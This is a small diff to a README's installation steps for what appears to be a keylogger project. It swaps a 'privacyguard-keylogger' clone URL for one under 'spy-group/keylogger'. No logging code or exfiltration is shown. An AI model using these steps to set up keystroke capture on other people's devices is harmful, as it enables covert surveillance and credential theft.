@@ -60,8 +60,8 @@ pip install keyboard
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/yourusername/privacyguard-keylogger.git
-   cd privacyguard-keylogger
+   git clone https://github.com/spy-group/keylogger.git
+   cd keylogger
    ```
 
 2. Save the script as `keylogger.py`.
